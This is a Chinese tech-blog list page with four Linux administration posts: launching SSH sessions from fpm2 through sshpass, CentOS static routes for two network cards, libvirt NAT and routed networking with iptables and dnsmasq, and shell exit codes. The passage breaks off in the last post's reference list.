<!doctype html>
<html lang="zh-Hans" dir="ltr" class="blog-wrapper blog-list-page plugin-blog plugin-id-default" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.0.1">
<title data-rh="true">Blog | 老司机的文档集</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://itxx00.github.io/notes/blog/page/4"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" property="og:title" content="Blog | 老司机的文档集"><meta data-rh="true" name="description" content="Blog"><meta data-rh="true" property="og:description" content="Blog"><meta data-rh="true" name="docusaurus_tag" content="blog_posts_list"><meta data-rh="true" name="docsearch:docusaurus_tag" content="blog_posts_list"><link data-rh="true" rel="icon" href="/notes/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://itxx00.github.io/notes/blog/page/4"><link data-rh="true" rel="alternate" href="https://itxx00.github.io/notes/blog/page/4" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://itxx00.github.io/notes/blog/page/4" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/notes/blog/rss.xml" title="老司机的文档集 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/notes/blog/atom.xml" title="老司机的文档集 Atom Feed"><link rel="stylesheet" href="/notes/assets/css/styles.f7e6fe78.css">
<script src="/notes/assets/js/runtime~main.8918262d.js" defer="defer"></script>
<script src="/notes/assets/js/main.1af6f9a7.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/notes/"><div class="navbar__logo"><img src="https://github.com/itxx00.png" alt="老司机" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="https://github.com/itxx00.png" alt="老司机" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">老司机</b></a><a class="navbar__item navbar__link" href="/notes/docs/intro">教程</a><a class="navbar__item navbar__link" href="/notes/blog/archive/">历史博文</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/notes/blog">博客</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/itxx00/notes" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="container margin-vert--lg"><div class="row"><aside class="col col--3"><nav class="sidebar_re4s thin-scrollbar" aria-label="最近博文导航"><div class="sidebarItemTitle_pO2u margin-bottom--md">Recent posts</div><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/notes/blog/2023/12/25/create-loop-lvm">如何通过loop模拟一个lvm逻辑卷</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/notes/blog/2023/02/02/non-root-systemd">普通用户执行systemctl启停服务禁用密码认证</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/notes/blog/2022/12/28/influxdb-ql-use-case">influxQL常用语句整理</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/notes/blog/2022/11/08/static-build-jq-fio">mac上使用docker交叉静态编译jq和fio</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/notes/blog/2022/04/20/pre-commit-basic">pre-commit basic usage</a></li></ul></nav></aside><main class="col col--7" itemscope="" itemtype="https://schema.org/Blog"><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/notes/blog/2013/11/12/use-fpm2-to-manage-password">使用fpm2来管理ssh密码</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2013-11-12T00:00:00.000Z" itemprop="datePublished">2013年11月12日</time> · <!-- -->阅读需 5 分钟</div></header><div class="markdown" itemprop="articleBody"><blockquote>
<p>不知道有没有童鞋需要管理一堆ssh口令，5个以内靠脑子记可能是个好办法，但是如果10个100个的时候恐怕脑子记有点不太够用。</p>
</blockquote>
<p>不知道有没有童鞋需要管理一堆ssh口令，5个以内靠脑子记可能是个好办法，但是如果10个100个的时候恐怕脑子记有点不太够用，
这个时候就需要借助外部工具来进行管理，当然你可以自己写个简单的脚本，把ssh账号密码写入一个list里面，
人懒且为了省事也可以使用一些现成的工具，下面就推荐一个图形界面的小工具给需要的童鞋：fpm2
fpm2全名Figaro&#x27;s Paaword Manager 2，是一个开源软件，使用GNU General Public License Version 2 协议，这里是<a href="http://als.regnet.cz/fpm2/">官方地址</a>，它还有android版本的。</p>
<p>在fedora里面可以直接yum安装：</p>
<p><code>yum install fpm2</code></p>
<p>安装完成后第一次运行需要你输入一个密码，今后每次启动fpm2的时候就用这个密码，默认如果密码输入错误次数超过3次，则你懂的。</p>
<p>打开fpm2后，一看就明白如何使用，它支持ssh/web以及自定义的密码管理，可以对管理的服务器进行分类，十分方便。其亮点是你可以根据自己的需要设置launcher，默认双击建立好的口令就会自动执行launcher定义的命令；</p>
<p>launcher里面将保存的账号密码和IP/URL定义为参数，<code>$a ip/url</code>  ，<code>$u  username</code>  ， <code>$p  password</code>， 有了这些变量后自定义launcher就很方便了。</p>
<p>但是其默认的ssh的launcher是不支持直接双击list里面的项目就登陆进服务  器的，这个时候需要另外一个小工具sshpass，它的用处是登陆ssh的时候可以把密码作为参数传递给ssh客户端，而不需要交互式输入密码，这个工具代码托管在sf，fedora里也可以yum安装：</p>
<p><code>yum install sshpass</code></p>
<p>光有这两个工具还不够，下面是将两个工具完美结合起来的关键：</p>
<p>在fpm2的settings选项卡下有launcher设置项，打开之后你会发现默认的ssh launcher，下面是我自定义的ssh的加载器命令：</p>
<p>配置launcher</p>
<p><code>gnome-terminal -e &#x27;sh -c &quot;&#x27;&quot;sshpass -p &#x27;&quot;&#x27;$p&#x27;&quot;&#x27; ssh  -p 22 $u@$a;sudo -s&quot;&#x27;&quot;&#x27;</code></p>
<p>特别注意里面的单双引号的写法，不然如果你的密码里有像%&amp;$之类的特殊符号时是会出问题的，</p>
<p><code>gnome-terminal -e &#x27;xxxxx&#x27;</code> 这里是单引号</p>
<p><code>sh -c &quot;&#x27;&quot; xxxxx &quot;&#x27;&quot;</code> 这里是两对双引号中包含的单引号</p>
<p><code>sshpass -p &#x27;&quot;&#x27; xxx &#x27;&quot;&#x27;</code> 这里是两对单引号包含的双引号</p>
<p>ssh命令后面加个sudo -s的作用是当退出ssh连接时不会立即关闭当前的terminal终端</p>
<p>使用这个launcher可以通杀所有特殊字符的密码，在运行fpm2+sshpass的组合前请自己使用当前运行fpm2的账户登陆ssh一下远程服务器将服务器的publickey取回来，没有key的情况下sshpass无法工作的。至少我遇到的是这样。</p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/fpm-2">fpm2</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting"><meta itemprop="description" content="演示如何为双网卡配置独立的路由规则"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/notes/blog/2013/11/11/centos-multi-network-interface-route">CentOS中双网卡静态路由配置</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2013-11-11T00:00:00.000Z" itemprop="datePublished">2013年11月11日</time> · <!-- -->阅读需 4 分钟</div></header><div class="markdown" itemprop="articleBody"><blockquote>
<p>一个网卡的话不需要静态路由的，如果多个网卡的话可以手工配置静态路由，特别是多个网卡走不同的子网的时候。</p>
</blockquote>
<h2 id="来自网上搜索的方法">来自网上搜索的方法</h2>
<p>之前一直没有配置过两个网卡分别使用不同的IP，走不同的网关，google了下发现了下面的手工添加路由的脚本：</p>
<pre><code class="language-bash">#!/bin/sh
ip route add 10.1.1.0/24 dev br0 src 10.1.1.10 table bond0
ip route add default via 10.1.1.1 dev br0 table bond0
ip rule add from 10.1.1.10/32 table bond0
ip rule add to 10.1.1.10/32 table bond0

ip route add 192.168.1.0/24 dev br1 src 192.168.1.10 table bond1
ip route add default via 192.168.1.1 dev br1 table bond1
ip rule add from 192.168.1.10/32 table bond1
ip rule add to 192.168.1.10/32 table bond1
</code></pre>
<h2 id="来自红帽文档中的方法">来自红帽文档中的方法</h2>
<p>后来想了想这样的问题系统肯定已经支持得很好了，只是没有找到配置方法，于是找了下红帽的文档，发现可以像下面这样配置：</p>
<h3 id="配置静态路由">配置静态路由</h3>
<p>一个网卡的话不需要静态路由的，如果多个网卡的话可以手工配置静态路由，特别是多个网卡走不同的子网的时候。</p>
<p><code>route -n   #查看当前路由信息</code></p>
<p>静态路由配置文件路径:
<code>/etc/sysconfig/network-scripts/route-interface_name</code>
就和网卡的配置文件路径结构差不多，比如ifcfg-eth0变成了route-eth0。</p>
<p>eth0网卡的静态路由就保存在这个文件里面。这个文 件可以有两种格式</p>
<ul>
<li>IP命令参数格式</li>
<li>网络/掩码指令格式</li>
</ul>
<h4 id="ip命令参数模式">IP命令参数模式：</h4>
<p>1）第一行定义默认路由：</p>
<pre><code>default via X.X.X.X dev interface
</code></pre>
<p>X.X.X.X 是默认路由的IP. interface是可以连接到默认路由的网卡接口名.</p>
<p>2）静态路由一行一个：</p>
<pre><code>X.X.X.X/X via X.X.X.X dev interface
</code></pre>
<p>X.X.X.X/X 是网络和掩码. X.X.X.X 和 interface 是各自网段的网关IP和网卡接口.</p>
<p>配置示例 route-eth0：
默认网关 192.168.0.1, 接口eth0. 两条静态路由到 10.10.10.0/24 和172.16.1.0/24 :</p>
<pre><code>default via 192.168.0.1 dev eth0
10.10.10.0/24 via 10.10.10.1 dev eth1
172.16.1.0/24 via 192.168.0.1 dev eth0
</code></pre>
<h4 id="网络掩码指令格式">网络/掩码指令格式：</h4>
<p>route-interface文件的第二种格式.下面是样板:</p>
<pre><code>ADDRESS0=X.X.X.X
NETMASK0=X.X.X.X
GATEWAY0=X.X.X.X
</code></pre>
<p>ADDRESS0=X.X.X.X 静态路由的网络编号.
NETMASK0=X.X.X.X 为上面那行设置子网掩码 .
GATEWAY0=X.X.X.X  能够连接到 ADDRESS0=X.X.X.X 这个网络的网关</p>
<p>配置示例 route-eth0：
默认网关 192.168.0.1, 接口 eth0. 两条到10.10.10.0/24 和172.16.1.0/24 的静态路由：</p>
<pre><code>ADDRESS0=10.10.10.0
NETMASK0=255.255.255.0
GATEWAY0=10.10.10.1
ADDRESS1=172.16.1.0
NETMASK1=255.255.255.0
GATEWAY1=192.168.0.1
</code></pre>
<p>ADDRESS0, ADDRESS1, ADDRESS2, 这样的编号必须是一个接一个的数字。</p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/centos">centos</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/route">route</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/notes/blog/2013/10/01/libvirt-basic-usage">libvirt中的网络管理实践</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2013-10-01T00:00:00.000Z" itemprop="datePublished">2013年10月1日</time> · <!-- -->阅读需 14 分钟</div></header><div class="markdown" itemprop="articleBody"><blockquote>
<p>逐步分析libvirt中的网络管理方法及实践，分析在nat网络中遇到的问题及解决思路</p>
</blockquote>
<h2 id="libvirt网络基本概念">libvirt网络基本概念</h2>
<p>libvirt默认使用了一个名为default的nat网络，这个网络默认使用virbr0作为桥接接口，使用dnsmasq来为使用nat网络的虚拟机提供dns及dhcp服务，dnsmasq生效后的配置文件默认保存在以下路径：</p>
<ul>
<li>/var/lib/libvirt/dnsmasq/default.hostsfile   mac&amp;&amp;ip绑定的配置文件</li>
<li>/var/lib/libvirt/dnsmasq/default.leases  dhcp分配到虚拟机的ip地址列表</li>
<li>/var/lib/libvirt/network/default.xml  default网络的配置文件</li>
</ul>
<p>dnsmasq服务的启动脚本在/etc/init.d/dnsmasq ，但是我们如果手动使用此脚本来启动服务将会导致dnsmasq读取其自己的配置文件来启动此服务，因此这么做是不推荐的，因为这个服务完全由libvirtd在接管，当libvirtd服务启动的时候，它会将它管理的被标记为autostart的network一并启动起来，而启动network的时候就会自动调用dnsmasq并赋予其适宜的配置文件来运行服务。</p>
<p>使用libvirt管理的网络都会用到dnsmasq来产生相应的配置，比如定义了一个名为route110的network，那么这个route110将使用一个新的桥接接口virbr1来接入网络，并使用dnsmasq产生名为route110.hostsfile和route110.leases的配置文件。其实这里提到的virbr0和virbr1都是libvirt产生的虚拟网卡，其作用就相当于一个虚拟交换机，为虚拟机提供网络转发服务。</p>
<h2 id="libvirt中网络的类型">libvirt中网络的类型</h2>
<p>首先分析一下libvirt所能提供的网络类型：isolated 和forwarding,其中，isolated意为绝对隔离的网络，也就是说处于此网络内的虚拟机对于外界是隔离的，这种模式可以用到一些特殊的场合，比如虚拟机只提供给内部使用，虚拟机只要求能相互通信而不需要与互联网通信。另外一类，forwarding，就是把虚拟机的数据forward到物理网络实现与外部网络进行通讯，其中forwarding又分为两种：nat和routed。</p>
<h3 id="nat">nat</h3>
<p>就是把虚拟机的网络数据在经过物理机网络的时候进行ip伪装，这样所有虚拟机出去的网络数据都相当于是物理机出去的数据，也就是说，我们可以分配给使用nat网络的虚拟机一个内网ip，而这个内网ip的虚拟机访问出去的时候外部网络看到的是物理机的公网ip，这样做的用处就是实现多个虚拟机共享物理主机的公网ip，节省公网ip地址；如前所述，默认情况下libvirt已经提供了一个名为default的nat网络，在不需要进行任何配置的情况下使用default网络的虚拟机即可访问互联网，但是互联网却无法访问虚拟机提供的服务，这是因为default网络只对虚拟机的数据包进行了伪装，而没有进行dnat和snat。</p>
<p>需要注意的是libvirt所实现的这种nat网络是通过物理机的iptables规则来实现的，也即是在虚拟机数据经过nat表的postrouting链出去的时候对其进行了伪装。</p>
<h3 id="routed">routed</h3>
<p>forwarding模式的另外一种，routed，就是将虚拟机的数据直接通过物理机route出去，和nat一样，也是需要一个virbr虚拟网卡接口来与外面进行通信，这种模式的不同之处在于虚拟机的数据没有经过伪装便直接交给了外部网络，也就是说，使用route模式网络的虚拟机可以使用公网ip地址，而物理机却恰恰在这个时候完全可以使用一个内网ip而不对外提供访问，这样，虚拟机的网卡仅仅把物理机当作一个route数据的工具，此模式应用的场合很多，比如需要让虚拟机运行在一个dmz网络中。但是使用route模式有诸多限制，例如物理机的网络接口不够用的情况下。</p>
<p>这里需要注意的是，nat模式和route模式的区别仅仅在于前者使用了iptables对虚拟机的数据包进行了伪装，而后者没有。</p>
<h2 id="自定义routed网络">自定义routed网络</h2>
<p>在实际的虚拟机使用过程中，我们可能会碰到下面的情况：</p>
<ul>
<li>1 使用nat网络的虚拟机也需要对外提供服务，</li>
<li>2 物理机只有一个网卡和一个ip，而我们现在既需要通过这个网卡来管理虚拟机，又需要使用这个网卡来提供route网络。</li>
</ul>
<p>当然你所能碰到的问题可能千奇百怪，也可能根本没有碰到过此类bt问题。下面的内容只作为分析和解决问题的思路，不能生搬。在了解了libvirt的网络管理模式之后，就可以自己动手解决这些限制，下面重点解释第二种问题的解决方法：</p>
<p>首先假定route网络使用的是virbr1虚拟网卡，而虚拟机使用virbr1来为虚拟机提供服务，而我本机又有了一个br0作为em1的桥接网卡来对外提供网络服务，br0的ip是192.168.1.51</p>
<p>首先禁用br0：</p>
<pre><code>ifdown br0
</code></pre>
<p>并配置br0的onboot为no,配置文件为<code>onboot=no</code></p>
<p>然后我们定义了一个名为route的网络，virbr1的ip设置为192.168.1.51 ，这样做的目的是让virbr1取代之前的br0.</p>
<pre><code class="language-xml">&lt;network&gt;
&lt;name&gt;route&lt;/name&gt;
&lt;uuid&gt;6224b437-386b-f510-11d5-58d58b1ce87a&lt;/uuid&gt;
&lt;forward mode=&#x27;route&#x27;/&gt;
&lt;bridge name=&#x27;virbr1&#x27; stp=&#x27;on&#x27; delay=&#x27;0&#x27; /&gt;
&lt;mac address=&#x27;52:54:00:C8:9F:07&#x27;/&gt;
&lt;ip address=&#x27;192.168.1.51&#x27; netmask=&#x27;255.255.255.0&#x27;&gt;
&lt;dhcp&gt;
&lt;range start=&#x27;192.168.1.128&#x27; end=&#x27;192.168.1.254&#x27; /&gt;
&lt;/dhcp&gt;
&lt;/ip&gt;
&lt;/network&gt;
</code></pre>
<p>接着生成并启用该网络</p>
<pre><code>virsh net-define route.xml
virsh net-start route
virsh net-autostart route
</code></pre>
<ul>
<li>/etc/libvirt/qemu/networks/  virsh net-define的network会保存到这</li>
<li>/var/lib/libvirt/network/  net-start启动了的network同时也会会保存到这</li>
<li>/etc/libvirt/qemu/networks/autostart/  net-autostart的network同时也会保存到这</li>
</ul>
<p>接下来，我们需要修改em1的配置并将其桥接到virbr1上</p>
<p>ifcfg-em1</p>
<pre><code>DEVICE=&quot;em1&quot;
ONBOOT=&quot;yes&quot;
BRIDGE=virbr1
</code></pre>
<p>接着启动em1</p>
<pre><code>ifup em1
</code></pre>
<p>至此em1就被桥接到了virbr1上，可以使用下面的命令检查</p>
<pre><code>brctl show
</code></pre>
<p>现在我们需要在本机添加一条默认路由，不然虚拟机是访问不了外面的：</p>
<pre><code>route add default gw 192.168.1.1 dev virbr1
</code></pre>
<p>这里的192.168.1.1是真实的路由。至此，问题已经解决了。</p>
<h2 id="自定义nat网络">自定义nat网络</h2>
<p>下面说说问题1的解决方法：
既然知道了nat出去的虚拟机只能访问外网而外网却不能访问进来，nat又是通过iptables来做的，也就是当libvirt每次启动的时候都会往iptables最前面插入自己的规则以保证nat的虚拟机能正常访问外网，那么我们是不是可以通过修改iptables的规则来实现呢，比如我们需要一个内网ip的虚拟机对外提供80服务，那么我们就把物理机的80端口映射到这台虚拟机的80端口上，因为我们的物理机是可以直接和虚拟机通信的，只是外网不能而已，下面添加规则：</p>
<pre><code>iptables -t nat -A PREROUTING -p tcp -i virbr1 --dport 80  -j DNAT --to-destination 192.168.122.2:80
</code></pre>
<p>这样我们对外部访问80端口进来  的数据进行了dnat，而出去的我们不用snat，只需要再添加如下规则：</p>
<pre><code>iptables -I FORWARD -i virbr1 -o virbr0 -p tcp -m state --state NEW -j ACCEPT
</code></pre>
<p>至此问题看似得到解决，但是我们忽略了一个关键的问题，那就是每当libvirt启动的时候就会往表的最前面插入它自己的规则，而iptables的规则是有先后顺序的，也就是说，我们自己添加的规则在libvirtd服务重启之后即被libvirt定义的规则所淹没，怎么办呢，我现在只想到了这么一个方法，直接修改libvirtd的启动脚本，在它的规则生效之后插入我们自定义的规则：</p>
<p>vi  /etc/init.d/libvirtd</p>
<pre><code>start() {
    echo -n $&quot;Starting $SERVICE daemon: &quot;
    initctl_check

    mkdir -p /var/cache/libvirt
    rm -rf /var/cache/libvirt/*
    KRB5_KTNAME=$KRB5_KTNAME daemon --pidfile $PIDFILE --check $SERVICE $PROCESS --daemon $LIBVIRTD_CONFIG_ARGS $LIBVIRTD_ARGS
    RETVAL=$?
    echo
    [ $RETVAL -eq 0 ] &amp;&amp; touch /var/lock/subsys/$SERVICE
    sleep 1
    iptables -D FORWARD -i virbr1 -o virbr0 -p tcp -m state --state NEW -j ACCEPT
    iptables -I FORWARD -i virbr1 -o virbr0 -p tcp -m state --state NEW -j ACCEPT
... ...
</code></pre>
<p>至此问题基本解决。</p>
<h2 id="route网络转换nat网络">route网络转换nat网络</h2>
<p>另外一个问题，我们前面有发现route和nat的网络区别仅仅是一个做了nat的iptables规则一个没有，那么我们可不可以自己在iptables里面添加相应的规则将route网络变身为nat网络呢？答案肯定是可以的，只需要添加上下面的规则即可,原理还请观看本文的同学自己分析，这里假设我们route网络给虚拟机分配的ip是192.168.100.0/24网段：</p>
<pre><code>iptables -t nat -A POSTROUTING -s 192.168.100.0/24 -d ! 192.168.100.0/24 -j MASQUERADE
iptables -A FORWARD --destination 192.168.100.0/24 -m state --state RELATED,ESTABLISHED -j ACCEPT
</code></pre>
<h2 id="自定义dnsmasq">自定义dnsmasq</h2>
<p>这里再添加一个可以手工启动dnsmasq的小脚本</p>
<pre><code class="language-bash">#!/bin/bash
brctl addbr routebr
ifconfig routebr 192.168.122.1 netmask 255.255.255.0
iptables -t nat -A POSTROUTING -s 192.168.122.0/24 -d ! 192.168.122.0/24 -j MASQUERADE
iptables -A FORWARD --destination 192.168.122.0/24 -m state --state RELATED,ESTABLISHED -j ACCEPT
/usr/sbin/dnsmasq \
--strict-order \
--bind-interfaces \
--pid-file=/usr/local/vps/network/default.pid \
--conf-file= \
--except-interface lo \
--listen-address 192.168.122.1 \
--dhcp-range 192.168.122.2,192.168.122.254 \
--dhcp-leasefile=/usr/local/vps/network/dnsmasq/default.leases \
--dhcp-lease-max=253 \
--dhcp-no-override \
--dhcp-hostsfile=/usr/local/vps/network/dnsmasq/default.hostsfile
</code></pre>
<h2 id="重启network导致网络中断">重启network导致网络中断</h2>
<p>当我们需要实时修改network的配置并使之生效的时候，就得重新启动此network，也就是需要net-destroy再net-start一下，我们的配置才能生效，但是随之而来的问题是，当network被重新启动之后，虚拟机便无法访问网络了，除非把虚拟机的network interface重新attach一下，或者等到虚拟机重新启动，那么为什么会出现这样的问题呢？我们先从它的表象开始分析，至于是否要追究到源码里面就取决于同学们自己了，反正我暂时没那功夫。这里仅仅是抛出来了一块砖。</p>
<p>当一个network启动之后，会自动生成一个虚拟网卡接口如virbr1，也会生成其他一些需要的东西，而重新启动了libvirt的network之后这个接口也会被重启，所以就导致了中途有一个中断的过程，</p>
<p>那事情就比较清晰了，如果你将libvirt启动网络的所有过程拆分开来一个一个的手动生成，需要修改某一部分配置的时候实际上你只需要修改对应的配置文件而不需要重新启动这个virbr1接口，比如上面提到的mac+ip的绑定，如果把dnsmasq独立出来，不让libvirt接管，那么增加了mac+ip绑定之后，仅仅需要重启dnsmasq这个服务。</p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/libvirt">libvirt</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/network">network</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting"><meta itemprop="description" content="about shell exit code"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/notes/blog/2013/05/17/bash-shell-exit-code">正确使用shell返回值</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2013-05-17T00:00:00.000Z" itemprop="datePublished">2013年5月17日</time> · <!-- -->阅读需 3 分钟</div></header><div class="markdown" itemprop="articleBody"><blockquote>
<p>编写shell脚本的时候，正确使用返回值是运维人员的基本操守</p>
</blockquote>
<h2 id="1常见返回值">1.常见返回值</h2>
<p>下表列出了常见shell命令的退出返回值：</p>
<table><thead><tr><th>返回值</th><th style="text-align:left">含义</th><th style="text-align:center">示例</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td style="text-align:left">各种常见错误</td><td style="text-align:center">let &quot;var1 = 1/0&quot;</td><td>shell里面最常见的错误返回值</td></tr><tr><td>2</td><td style="text-align:left">shell内建功能使用错误</td><td style="text-align:center">empty_function() </td><td>常见于关键字或者命令出错</td></tr><tr><td>126</td><td style="text-align:left">命令无法执行</td><td style="text-align:center">/dev/null</td><td>由于权限等导致的命令无法执行</td></tr><tr><td>127</td><td style="text-align:left">命令无法找到</td><td style="text-align:center">illegal_command</td><td>一般是PATH环境变量不对等</td></tr><tr><td>128</td><td style="text-align:left">退出返回值错误</td><td style="text-align:center">exit 3.14159</td><td>返回值只能是整数，小数就不对了</td></tr><tr><td>128+n</td><td style="text-align:left">信号 &quot;n&quot;+128</td><td style="text-align:center">kill -9 $PPID of script</td><td>$? 即返回 137 (128 + 9)</td></tr><tr><td>130</td><td style="text-align:left">ctrl+c 退出</td><td style="text-align:center">Ctl-C</td><td>其实ctrl+c返回的是2 (130 = 128 + 2)</td></tr><tr><td>255*</td><td style="text-align:left">返回值超出可接受的范围</td><td style="text-align:center">exit  -1</td><td>只能是 0 - 255</td></tr></tbody></table>
<h2 id="2-init标准返回值">2. init标准返回值</h2>
<p>下表列出了关于/etc/init.d/目录下启动控制脚本的标准返回值：</p>
<ul>
<li>0    程序在运行或者服务状态OK</li>
<li>1    程序已经死掉，但是 pid文件仍在 /var/run目录下存在</li>
<li>2    程序已经死掉，但是lock文件仍在 /var/lock 目录下存在</li>
<li>3    程序没有运行</li>
<li>4    程序运行状态未知</li>
<li>5-99    供LSB扩展的保留段</li>
<li>100-149    供特定系统发行版使用的保留段</li>
<li>150-199    供特定程序使用的保留段</li>
<li>200-254    保留段</li>
</ul>
<h2 id="3-建议返回值">3. 建议返回值</h2>
<p>在写shell脚本的时候需要注意自定义的退出返回值最好不要与上面表格中所定义的重复，对于管理人员来说养成良好的习惯有助于遇到错误时作出正确的判断。
根据上表至少可以得出，在自定义返回值的时候：</p>
<ul>
<li>最好不要用的：0-4 126-130 255</li>
<li>应避免使用的：5-99</li>
<li>可随意使用的：100-125 131-254</li>
</ul>
<p>参考文档:</p>
<ul>
<li>
<p>[1] <a href="http://tldp.org/LDP/abs/html/exitcodes.html">http://tldp.org/LDP/abs/html/exitcodes.html</a></p>
</li>
<li>
